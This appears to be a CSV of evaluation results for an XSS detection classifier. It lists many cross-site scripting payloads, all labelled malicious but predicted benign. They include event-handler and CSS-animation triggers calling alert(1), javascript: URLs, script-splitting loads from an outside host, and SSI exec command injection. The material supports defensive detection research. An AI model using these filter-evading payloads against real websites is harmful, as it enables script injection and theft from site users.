payload,true_label,predicted_label,probabilities,inference_time_ms
<link onfocus=alert(1) id=x tabindex=1 style=display:block>,1,0,"{'benign': 0.5997, 'malicious': 0.4003}",86.63409999999772
<image3 onpointerover=alert(1)>XSS</image3>,1,0,"{'benign': 0.5971, 'malicious': 0.4029}",54.67780000000744
"<article onmouseenter=""alert(1)"">test</article>",1,0,"{'benign': 0.5887, 'malicious': 0.4113}",85.06689999998684
<video onpointerover=alert(1)>XSS</video>,1,0,"{'benign': 0.5988, 'malicious': 0.4012}",92.087499999991
"<legend onkeypress=""alert(1)"" contenteditable>test</legend>",1,0,"{'benign': 0.5957, 'malicious': 0.4043}",91.60179999997808
<i onpointerleave=alert(1)>XSS</i>,1,0,"{'benign': 0.6013, 'malicious': 0.3987}",71.76229999998895
<source onpointerleave=alert(1)>XSS</source>,1,0,"{'benign': 0.5975, 'malicious': 0.4025}",57.4833999999953
<nobr onpointerleave=alert(1)>XSS</nobr>,1,0,"{'benign': 0.599, 'malicious': 0.401}",61.560700000001134
"<style>:target {transform: rotate(180deg);}</style><xmp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xmp>",1,0,"{'benign': 0.6074, 'malicious': 0.3926}",106.65539999999396
"<tt draggable=""true"" ondragend=""alert(1)"">test</tt>",1,0,"{'benign': 0.5868, 'malicious': 0.4132}",68.07090000000926
<title onpointerover=alert(1)>XSS</title>,1,0,"{'benign': 0.5991, 'malicious': 0.4009}",49.79489999999487
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationend=""alert(1)""></sub>",1,0,"{'benign': 0.6021, 'malicious': 0.3979}",63.831700000008595
"<center onmousedown=""alert(1)"">test</center>",1,0,"{'benign': 0.5908, 'malicious': 0.4092}",47.480900000010706
"document.getElementsByClassName(""example"")",1,0,"{'benign': 0.5725, 'malicious': 0.4275}",57.48939999998015
<optgroup id=x tabindex=1 ondeactivate=alert(1)></optgroup><input id=y autofocus>,1,0,"{'benign': 0.5936, 'malicious': 0.4064}",75.12460000000942
<IMG SRC=javascript:alert('')>,1,0,"{'benign': 0.5881, 'malicious': 0.4119}",44.558099999989054
"<marquee onmouseup=""alert(1)"">test</marquee>",1,0,"{'benign': 0.59, 'malicious': 0.41}",179.15190000002212
"<frameset onbeforecopy=""alert(1)"" contenteditable>test</frameset>",1,0,"{'benign': 0.5953, 'malicious': 0.4047}",69.2790999999886
"<div draggable=""true"" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>",1,0,"{'benign': 0.6018, 'malicious': 0.3982}",71.11740000001987
"<style>@keyframes slidein {}</style><del style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></del>",1,0,"{'benign': 0.604, 'malicious': 0.396}",105.53369999999518
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",1,0,"{'benign': 0.598, 'malicious': 0.402}",72.95160000001033
"<figcaption onmouseup=""alert(1)"">test</figcaption>",1,0,"{'benign': 0.5898, 'malicious': 0.4102}",74.31560000000559
"<ins onkeyup=""alert(1)"" contenteditable>test</ins>",1,0,"{'benign': 0.5936, 'malicious': 0.4064}",74.28179999999429
"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>",1,0,"{'benign': 0.5939, 'malicious': 0.4061}",73.0118000000175
<dialog onpointermove=alert(1)>XSS</dialog>,1,0,"{'benign': 0.6, 'malicious': 0.4}",82.02599999998483
<font onpointerover=alert(1)>XSS</font>,1,0,"{'benign': 0.5943, 'malicious': 0.4057}",195.48620000000483
"<summary onmouseenter=""alert(1)"">test</summary>",1,0,"{'benign': 0.5898, 'malicious': 0.4102}",92.55389999998442
"<dir draggable=""true"" ondragstart=""alert(1)"">test</dir>",1,0,"{'benign': 0.5934, 'malicious': 0.4066}",101.4157000000182
"<rp draggable=""true"" ondragstart=""alert(1)"">test</rp>",1,0,"{'benign': 0.5955, 'malicious': 0.4045}",111.74280000000181
"<template oncut=""alert(1)"" contenteditable>test</template>",1,0,"{'benign': 0.5939, 'malicious': 0.4061}",48.65060000000199
<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>,1,0,"{'benign': 0.5976, 'malicious': 0.4024}",55.661200000002964
<button onfocusout=alert(1) id=x></button><input autofocus>,1,0,"{'benign': 0.5979, 'malicious': 0.4021}",74.7141999999883
"<style>:target {transform: rotate(180deg);}</style><datalist id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></datalist>",1,0,"{'benign': 0.6084, 'malicious': 0.3916}",89.49350000000322
"<param oncut=""alert(1)"" contenteditable>test</param>",1,0,"{'benign': 0.5946, 'malicious': 0.4054}",46.302499999995916
"<bdi ondblclick=""alert(1)"">test</bdi>",1,0,"{'benign': 0.5855, 'malicious': 0.4145}",47.29009999999789
"<div draggable=""true"" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>",1,0,"{'benign': 0.5998, 'malicious': 0.4002}",57.63960000001589
"<wbr onclick=""alert(1)"">test</wbr>",1,0,"{'benign': 0.5866, 'malicious': 0.4134}",45.19880000000853
"<dfn onkeypress=""alert(1)"" contenteditable>test</dfn>",1,0,"{'benign': 0.5959, 'malicious': 0.4041}",47.17930000001047
"<center onbeforecopy=""alert(1)"" contenteditable>test</center>",1,0,"{'benign': 0.5967, 'malicious': 0.4033}",46.19060000001696
"<center draggable=""true"" ondragleave=""alert(1)"">test</center>",1,0,"{'benign': 0.5925, 'malicious': 0.4075}",333.22110000000293
"<abbr ondblclick=""alert(1)"">test</abbr>",1,0,"{'benign': 0.5861, 'malicious': 0.4139}",60.431499999992866
<colgroup onpointermove=alert(1)>XSS</colgroup>,1,0,"{'benign': 0.5988, 'malicious': 0.4012}",77.98230000000217
<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,1,0,"{'benign': 0.5981, 'malicious': 0.4019}",77.62969999998859
<svg><address onload=alert(1)></address>,1,0,"{'benign': 0.5947, 'malicious': 0.4053}",65.6842999999867
"<style>:target {color: red;}</style><multicol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></multicol>",1,0,"{'benign': 0.5979, 'malicious': 0.4021}",81.88220000002389
<footer id=x tabindex=1 onfocus=alert(1)></footer>,1,0,"{'benign': 0.5943, 'malicious': 0.4057}",68.8663000000247
<sub id=x tabindex=1 onfocusin=alert(1)></sub>,1,0,"{'benign': 0.5999, 'malicious': 0.4001}",64.77769999997918
"<time onclick=""alert(1)"">test</time>",1,0,"{'benign': 0.587, 'malicious': 0.413}",56.797299999999495
"<aside onmouseout=""alert(1)"">test</aside>",1,0,"{'benign': 0.5876, 'malicious': 0.4124}",76.57150000000001
"<select draggable=""true"" ondrag=""alert(1)"">test</select>",1,0,"{'benign': 0.5871, 'malicious': 0.4129}",123.88630000000944
"<canvas oncontextmenu=""alert(1)"">test</canvas>",1,0,"{'benign': 0.5955, 'malicious': 0.4045}",105.25619999998526
<figure id=x tabindex=1 onbeforeactivate=alert(1)></figure>,1,0,"{'benign': 0.5993, 'malicious': 0.4007}",85.86830000001555
"<source oncontextmenu=""alert(1)"">test</source>",1,0,"{'benign': 0.5966, 'malicious': 0.4034}",52.76770000000397
"<tbody onkeypress=""alert(1)"" contenteditable>test</tbody>",1,0,"{'benign': 0.5965, 'malicious': 0.4035}",93.22470000000749
"<q onbeforecopy=""alert(1)"" contenteditable>test</q>",1,0,"{'benign': 0.5995, 'malicious': 0.4005}",59.92240000000493
<source onpointerdown=alert(1)>XSS</source>,1,0,"{'benign': 0.5967, 'malicious': 0.4033}",57.631099999980506
<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>,1,0,"{'benign': 0.5913, 'malicious': 0.4087}",78.47329999998465
<button onpointermove=alert(1)>XSS</button>,1,0,"{'benign': 0.5966, 'malicious': 0.4034}",57.195100000001275
"<col onmousemove=""alert(1)"">test</col>",1,0,"{'benign': 0.588, 'malicious': 0.412}",50.231899999999996
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",1,0,"{'benign': 0.6016, 'malicious': 0.3984}",66.1809000000062
"<b onmouseup=""alert(1)"">test</b>",1,0,"{'benign': 0.5874, 'malicious': 0.4126}",55.67890000000375
<button id=x tabindex=1 onactivate=alert(1)></button>,1,0,"{'benign': 0.5935, 'malicious': 0.4065}",46.75019999999108
"<body onkeypress=""alert(1)"" contenteditable>test</body>",1,0,"{'benign': 0.5944, 'malicious': 0.4056}",52.08690000000615
<ol onpointerout=alert(1)>XSS</ol>,1,0,"{'benign': 0.6023, 'malicious': 0.3977}",53.958100000016884
"<button onpaste=""alert(1)"" contenteditable>test</button>",1,0,"{'benign': 0.5914, 'malicious': 0.4086}",84.76690000000531
"<h1 draggable=""true"" ondragend=""alert(1)"">test</h1>",1,0,"{'benign': 0.5921, 'malicious': 0.4079}",128.56550000000766
"<applet onpaste=""alert(1)"" contenteditable>test</applet>",1,0,"{'benign': 0.5918, 'malicious': 0.4082}",68.37589999997817
<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,1,0,"{'benign': 0.6025, 'malicious': 0.3975}",81.06570000001057
"<center draggable=""true"" ondrag=""alert(1)"">test</center>",1,0,"{'benign': 0.5936, 'malicious': 0.4064}",62.71639999999934
"<table oncontextmenu=""alert(1)"">test</table>",1,0,"{'benign': 0.5984, 'malicious': 0.4016}",318.95750000001044
<samp onpointermove=alert(1)>XSS</samp>,1,0,"{'benign': 0.5989, 'malicious': 0.4011}",92.58330000000115
<mark onpointerleave=alert(1)>XSS</mark>,1,0,"{'benign': 0.5959, 'malicious': 0.4041}",84.43100000002346
"<main onbeforecut=""alert(1)"" contenteditable>test</main>",1,0,"{'benign': 0.5983, 'malicious': 0.4017}",107.8995999999961
"<style>@keyframes slidein {}</style><video style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></video>",1,0,"{'benign': 0.605, 'malicious': 0.395}",178.79579999998896
<body onload=alert(1)>,1,0,"{'benign': 0.5899, 'malicious': 0.4101}",100.55819999999471
"<image onmousedown=""alert(1)"">test</image>",1,0,"{'benign': 0.5874, 'malicious': 0.4126}",138.48469999999224
"<STYLE>BODY{-moz-binding:url(""http://.rocks/moz.xml#"")}</STYLE>",1,0,"{'benign': 0.5976, 'malicious': 0.4024}",104.00379999998677
<svg><noembed onload=alert(1)></noembed>,1,0,"{'benign': 0.5918, 'malicious': 0.4082}",94.33559999999375
"<rp onmouseenter=""alert(1)"">test</rp>",1,0,"{'benign': 0.5873, 'malicious': 0.4127}",84.21889999999621
"<element onmouseout=""alert(1)"">test</element>",1,0,"{'benign': 0.5884, 'malicious': 0.4116}",367.15270000001965
"<samp onpaste=""alert(1)"" contenteditable>test</samp>",1,0,"{'benign': 0.5928, 'malicious': 0.4072}",116.51340000000232
"<spacer draggable=""true"" ondragstart=""alert(1)"">test</spacer>",1,0,"{'benign': 0.5947, 'malicious': 0.4053}",83.13809999998512
"<object onmouseover=""alert(1)"">test</object>",1,0,"{'benign': 0.5907, 'malicious': 0.4093}",183.21419999998056
"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></b>",1,0,"{'benign': 0.6082, 'malicious': 0.3918}",115.69579999999746
<embed onpointermove=alert(1)>XSS</embed>,1,0,"{'benign': 0.5993, 'malicious': 0.4007}",86.74560000000042
"<th onbeforepaste=""alert(1)"" contenteditable>test</th>",1,0,"{'benign': 0.5954, 'malicious': 0.4046}",61.183299999981955
"<section draggable=""true"" ondragleave=""alert(1)"">test</section>",1,0,"{'benign': 0.591, 'malicious': 0.409}",92.49410000001035
<dl onpointerdown=alert(1)>XSS</dl>,1,0,"{'benign': 0.5983, 'malicious': 0.4017}",80.01219999999876
"<blink onmousedown=""alert(1)"">test</blink>",1,0,"{'benign': 0.59, 'malicious': 0.41}",84.89730000002282
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,1,0,"{'benign': 0.5932, 'malicious': 0.4068}",86.53769999997962
"<option onbeforepaste=""alert(1)"" contenteditable>test</option>",1,0,"{'benign': 0.5933, 'malicious': 0.4067}",77.96000000001868
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationstart=""alert(1)""></video>",1,0,"{'benign': 0.6054, 'malicious': 0.3946}",101.32229999999254
<input4 onpointermove=alert(1)>XSS</input4>,1,0,"{'benign': 0.596, 'malicious': 0.404}",85.66509999999994
"<style>:target {color: red;}</style><rb id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rb>",1,0,"{'benign': 0.6016, 'malicious': 0.3984}",104.0967000000137
"<tt ondblclick=""alert(1)"">test</tt>",1,0,"{'benign': 0.5835, 'malicious': 0.4165}",77.54070000001434
"<div draggable=""true"" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>",1,0,"{'benign': 0.6011, 'malicious': 0.3989}",98.43089999998256
"<track onmouseover=""alert(1)"">test</track>",1,0,"{'benign': 0.5902, 'malicious': 0.4098}",60.64740000002189
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,1,0,"{'benign': 0.5958, 'malicious': 0.4042}",168.54699999998957
"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>",1,0,"{'benign': 0.5961, 'malicious': 0.4039}",93.67249999999672
"<section onmouseover=""alert(1)"">test</section>",1,0,"{'benign': 0.5921, 'malicious': 0.4079}",71.15060000000994
"<time oncontextmenu=""alert(1)"">test</time>",1,0,"{'benign': 0.5965, 'malicious': 0.4035}",62.79720000000566
"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>",1,0,"{'benign': 0.6033, 'malicious': 0.3967}",125.48530000000824
"<bgsound onbeforepaste=""alert(1)"" contenteditable>test</bgsound>",1,0,"{'benign': 0.5936, 'malicious': 0.4064}",99.08020000000306
"<style>@keyframes slidein {}</style><pre style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></pre>",1,0,"{'benign': 0.6039, 'malicious': 0.3961}",127.92739999997593
"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" ontransitionend=alert(1)></code>",1,0,"{'benign': 0.599, 'malicious': 0.401}",154.734899999994
"<style>:target {color:red;}</style><applet id=x style=""transition:color 1s"" ontransitionend=alert(1)></applet>",1,0,"{'benign': 0.596, 'malicious': 0.404}",132.43719999999826
"<col oncut=""alert(1)"" contenteditable>test</col>",1,0,"{'benign': 0.5915, 'malicious': 0.4085}",103.84350000001064
"<thead onbeforepaste=""alert(1)"" contenteditable>test</thead>",1,0,"{'benign': 0.5941, 'malicious': 0.4059}",142.09809999999834
<figure id=x tabindex=1 onactivate=alert(1)></figure>,1,0,"{'benign': 0.5942, 'malicious': 0.4058}",84.13620000001742
"<figure draggable=""true"" ondragenter=""alert(1)"">test</figure>",1,0,"{'benign': 0.5902, 'malicious': 0.4098}",92.3708999999917
"<h1 onkeypress=""alert(1)"" contenteditable>test</h1>",1,0,"{'benign': 0.5977, 'malicious': 0.4023}",88.71290000001864
<svg><bdi onload=alert(1)></bdi>,1,0,"{'benign': 0.5933, 'malicious': 0.4067}",123.72569999999428
"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>",1,0,"{'benign': 0.5893, 'malicious': 0.4107}",67.90549999999484
"<picture onmouseup=""alert(1)"">test</picture>",1,0,"{'benign': 0.5869, 'malicious': 0.4131}",51.985800000011295
"<details draggable=""true"" ondragend=""alert(1)"">test</details>",1,0,"{'benign': 0.5902, 'malicious': 0.4098}",68.9612999999838
"<STYLE TYPE=""text/javascript"">alert('');</STYLE>",1,0,"{'benign': 0.5889, 'malicious': 0.4111}",63.090900000020156
<applet onreadystatechange=alert(1)></applet>,1,0,"{'benign': 0.5877, 'malicious': 0.4123}",61.401100000011866
"<output oncut=""alert(1)"" contenteditable>test</output>",1,0,"{'benign': 0.5944, 'malicious': 0.4056}",53.167399999978215
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationend=""alert(1)""></u>",1,0,"{'benign': 0.6031, 'malicious': 0.3969}",66.91150000000334
"<element onmouseenter=""alert(1)"">test</element>",1,0,"{'benign': 0.5878, 'malicious': 0.4122}",63.288400000004685
"<span draggable=""true"" ondragenter=""alert(1)"">test</span>",1,0,"{'benign': 0.59, 'malicious': 0.41}",61.06509999997911
"<pre onbeforecopy=""alert(1)"" contenteditable>test</pre>",1,0,"{'benign': 0.5973, 'malicious': 0.4027}",159.73489999998947
"<command onkeyup=""alert(1)"" contenteditable>test</command>",1,0,"{'benign': 0.5934, 'malicious': 0.4066}",60.4708000000187
"<blink draggable=""true"" ondragenter=""alert(1)"">test</blink>",1,0,"{'benign': 0.5911, 'malicious': 0.4089}",75.70649999999546
"<strike onkeydown=""alert(1)"" contenteditable>test</strike>",1,0,"{'benign': 0.5924, 'malicious': 0.4076}",52.26079999999911
"<source onmouseup=""alert(1)"">test</source>",1,0,"{'benign': 0.5885, 'malicious': 0.4115}",49.71690000002127
<shadow onpointermove=alert(1)>XSS</shadow>,1,0,"{'benign': 0.5969, 'malicious': 0.4031}",59.84879999999748
<svg onpointerenter=alert(1)>XSS</svg>,1,0,"{'benign': 0.6011, 'malicious': 0.3989}",61.22330000002307
<hgroup onpointerenter=alert(1)>XSS</hgroup>,1,0,"{'benign': 0.6036, 'malicious': 0.3964}",51.825399999984256
"<keygen onclick=""alert(1)"">test</keygen>",1,0,"{'benign': 0.5848, 'malicious': 0.4152}",50.99289999998291
"<section onmouseup=""alert(1)"">test</section>",1,0,"{'benign': 0.5909, 'malicious': 0.4091}",57.38079999997581
"<style>:target {color: red;}</style><aside id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></aside>",1,0,"{'benign': 0.5998, 'malicious': 0.4002}",82.25780000000782
"<body draggable=""true"" ondrag=""alert(1)"">test</body>",1,0,"{'benign': 0.5917, 'malicious': 0.4083}",59.53779999998687
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationend=""alert(1)""></strike>",1,0,"{'benign': 0.6, 'malicious': 0.4}",227.11250000000405
<image2 onpointerdown=alert(1)>XSS</image2>,1,0,"{'benign': 0.5957, 'malicious': 0.4043}",87.90899999999624
"<element draggable=""true"" ondrag=""alert(1)"">test</element>",1,0,"{'benign': 0.5897, 'malicious': 0.4103}",64.3987999999922
"<figure oncut=""alert(1)"" contenteditable>test</figure>",1,0,"{'benign': 0.5926, 'malicious': 0.4074}",68.21540000001391
<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>,1,0,"{'benign': 0.5964, 'malicious': 0.4036}",56.9725999999946
<iframe id=x onfocusin=alert(1)>,1,0,"{'benign': 0.6024, 'malicious': 0.3976}",65.61729999998533
"<menu onmouseover=""alert(1)"">test</menu>",1,0,"{'benign': 0.5915, 'malicious': 0.4085}",54.72109999999475
"<figcaption draggable=""true"" ondrag=""alert(1)"">test</figcaption>",1,0,"{'benign': 0.5934, 'malicious': 0.4066}",61.802599999992935
"<section ondblclick=""alert(1)"">test</section>",1,0,"{'benign': 0.5859, 'malicious': 0.4141}",58.923599999985754
"<map onkeydown=""alert(1)"" contenteditable>test</map>",1,0,"{'benign': 0.5943, 'malicious': 0.4057}",92.3962999999901
"<link draggable=""true"" ondragenter=""alert(1)"">test</link>",1,0,"{'benign': 0.5899, 'malicious': 0.4101}",113.81570000000352
"<img onkeypress=""alert(1)"" contenteditable>test</img>",1,0,"{'benign': 0.5925, 'malicious': 0.4075}",90.88320000000749
<tr onpointermove=alert(1)>XSS</tr>,1,0,"{'benign': 0.6, 'malicious': 0.4}",82.8653000000088
<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>,1,0,"{'benign': 0.6025, 'malicious': 0.3975}",96.29739999999742
"<STYLE type=""text/css"">BODY{background:url(""<javascript:alert>('')"")}</STYLE>",1,0,"{'benign': 0.5992, 'malicious': 0.4008}",109.20330000001854
"<dt onkeydown=""alert(1)"" contenteditable>test</dt>",1,0,"{'benign': 0.5935, 'malicious': 0.4065}",98.19910000001641
<del id=x tabindex=1 onactivate=alert(1)></del>,1,0,"{'benign': 0.5981, 'malicious': 0.4019}",92.35129999999003
"<output onkeypress=""alert(1)"" contenteditable>test</output>",1,0,"{'benign': 0.5951, 'malicious': 0.4049}",100.33070000000066
"<div draggable=""true"" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>",1,0,"{'benign': 0.6009, 'malicious': 0.3991}",121.54429999998229
"<noembed onbeforecopy=""alert(1)"" contenteditable>test</noembed>",1,0,"{'benign': 0.5984, 'malicious': 0.4016}",56.62390000000528
"<slot ondblclick=""alert(1)"">test</slot>",1,0,"{'benign': 0.5846, 'malicious': 0.4154}",78.35370000000808
"<dd onpaste=""alert(1)"" contenteditable>test</dd>",1,0,"{'benign': 0.5918, 'malicious': 0.4082}",64.73879999998644
"<li onkeyup=""alert(1)"" contenteditable>test</li>",1,0,"{'benign': 0.5921, 'malicious': 0.4079}",54.4315999999867
<keygen onpointerenter=alert(1)>XSS</keygen>,1,0,"{'benign': 0.6012, 'malicious': 0.3988}",60.13360000000034
<rtc onpointerdown=alert(1)>XSS</rtc>,1,0,"{'benign': 0.5993, 'malicious': 0.4007}",67.92540000000713
"<legend ondblclick=""alert(1)"">test</legend>",1,0,"{'benign': 0.587, 'malicious': 0.413}",76.86730000000352
"<footer draggable=""true"" ondragend=""alert(1)"">test</footer>",1,0,"{'benign': 0.5923, 'malicious': 0.4077}",86.88319999998839
"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>",1,0,"{'benign': 0.6026, 'malicious': 0.3974}",97.03229999999508
"<data draggable=""true"" ondragstart=""alert(1)"">test</data>",1,0,"{'benign': 0.5898, 'malicious': 0.4102}",65.39420000001428
"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",1,0,"{'benign': 0.5919, 'malicious': 0.4081}",62.00269999999364
"<rb draggable=""true"" ondrag=""alert(1)"">test</rb>",1,0,"{'benign': 0.5929, 'malicious': 0.4071}",75.84370000000717
"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xss>",1,0,"{'benign': 0.6065, 'malicious': 0.3935}",76.62009999998531
"<pre ondblclick=""alert(1)"">test</pre>",1,0,"{'benign': 0.5838, 'malicious': 0.4162}",52.719500000023345
<wbr onpointerleave=alert(1)>XSS</wbr>,1,0,"{'benign': 0.5997, 'malicious': 0.4003}",59.70360000000596
"<ol onmouseleave=""alert(1)"">test</ol>",1,0,"{'benign': 0.5873, 'malicious': 0.4127}",64.19610000000375
"<area onclick=""alert(1)"">test</area>",1,0,"{'benign': 0.5875, 'malicious': 0.4125}",65.75080000001776
"<span onpaste=""alert(1)"" contenteditable>test</span>",1,0,"{'benign': 0.5908, 'malicious': 0.4092}",67.41209999998432
<header id=x tabindex=1 onfocus=alert(1)></header>,1,0,"{'benign': 0.5938, 'malicious': 0.4062}",59.131299999990006
<hgroup onpointerleave=alert(1)>XSS</hgroup>,1,0,"{'benign': 0.5997, 'malicious': 0.4003}",79.08219999998778
"<fieldset onkeypress=""alert(1)"" contenteditable>test</fieldset>",1,0,"{'benign': 0.5934, 'malicious': 0.4066}",87.6440000000116
"<sup onmouseleave=""alert(1)"">test</sup>",1,0,"{'benign': 0.5866, 'malicious': 0.4134}",103.50579999999354
<select onpointerup=alert(1)>XSS</select>,1,0,"{'benign': 0.5931, 'malicious': 0.4069}",81.1300000000017
<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>,1,0,"{'benign': 0.5912, 'malicious': 0.4088}",82.2232000000156
<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>,1,0,"{'benign': 0.593, 'malicious': 0.407}",67.99809999998274
<tfoot onpointerleave=alert(1)>XSS</tfoot>,1,0,"{'benign': 0.5993, 'malicious': 0.4007}",105.51900000001524
<article onpointerleave=alert(1)>XSS</article>,1,0,"{'benign': 0.5974, 'malicious': 0.4026}",90.32080000000065
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""httx://.rocks/.js""></SCRIPT>",1,0,"{'benign': 0.6097, 'malicious': 0.3903}",84.34199999999237
"<button ondblclick=""alert(1)"">test</button>",1,0,"{'benign': 0.5842, 'malicious': 0.4158}",64.83359999998584
"<spacer onmouseenter=""alert(1)"">test</spacer>",1,0,"{'benign': 0.5869, 'malicious': 0.4131}",67.96389999999519
"<hr onmousedown=""alert(1)"">test</hr>",1,0,"{'benign': 0.5911, 'malicious': 0.4089}",75.7069999999942
"<html onmouseover=""alert(1)"">test</html>",1,0,"{'benign': 0.5898, 'malicious': 0.4102}",87.2241999999801
"<legend oncut=""alert(1)"" contenteditable>test</legend>",1,0,"{'benign': 0.5949, 'malicious': 0.4051}",114.98509999998419
"<base onmouseout=""alert(1)"">test</base>",1,0,"{'benign': 0.5891, 'malicious': 0.4109}",62.540800000022045
<select onpointerdown=alert(1)>XSS</select>,1,0,"{'benign': 0.5934, 'malicious': 0.4066}",48.95210000000816
<acronym onpointerup=alert(1)>XSS</acronym>,1,0,"{'benign': 0.5977, 'malicious': 0.4023}",73.49460000000363
<dd id=x tabindex=1 onfocus=alert(1)></dd>,1,0,"{'benign': 0.5918, 'malicious': 0.4082}",140.1590999999769
"<nobr draggable=""true"" ondragleave=""alert(1)"">test</nobr>",1,0,"{'benign': 0.5931, 'malicious': 0.4069}",132.62470000000803
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationstart=""alert(1)""></aside>",1,0,"{'benign': 0.6042, 'malicious': 0.3958}",180.347299999994
"<style>:target {color: red;}</style><track id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></track>",1,0,"{'benign': 0.6002, 'malicious': 0.3998}",214.7395000000074
"<progress draggable=""true"" ondragend=""alert(1)"">test</progress>",1,0,"{'benign': 0.5933, 'malicious': 0.4067}",124.26270000000272
"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",1,0,"{'benign': 0.5894, 'malicious': 0.4106}",96.07929999998532
"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>",1,0,"{'benign': 0.6024, 'malicious': 0.3976}",109.07910000000243
"<progress draggable=""true"" ondrag=""alert(1)"">test</progress>",1,0,"{'benign': 0.5951, 'malicious': 0.4049}",72.10670000000619
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'""",1,0,"{'benign': 0.6035, 'malicious': 0.3965}",96.22949999999264
<fieldset onpointerleave=alert(1)>XSS</fieldset>,1,0,"{'benign': 0.6001, 'malicious': 0.3999}",85.83579999998392
<svg><picture onload=alert(1)></picture>,1,0,"{'benign': 0.5893, 'malicious': 0.4107}",153.34620000001564
"<iframe onbeforepaste=""alert(1)"" contenteditable>test</iframe>",1,0,"{'benign': 0.5959, 'malicious': 0.4041}",326.82790000001205
<embed id=x tabindex=1 onbeforedeactivate=alert(1)></embed><input autofocus>,1,0,"{'benign': 0.5993, 'malicious': 0.4007}",109.96260000001712
"<i draggable=""true"" ondragstart=""alert(1)"">test</i>",1,0,"{'benign': 0.5954, 'malicious': 0.4046}",82.38989999998125
"<center onpaste=""alert(1)"" contenteditable>test</center>",1,0,"{'benign': 0.5934, 'malicious': 0.4066}",72.01649999998949
"<meta onmousedown=""alert(1)"">test</meta>",1,0,"{'benign': 0.5891, 'malicious': 0.4109}",72.77320000000032
"<image draggable=""true"" ondragstart=""alert(1)"">test</image>",1,0,"{'benign': 0.5902, 'malicious': 0.4098}",105.91449999998304
"<multicol onmouseenter=""alert(1)"">test</multicol>",1,0,"{'benign': 0.5864, 'malicious': 0.4136}",83.9394999999854
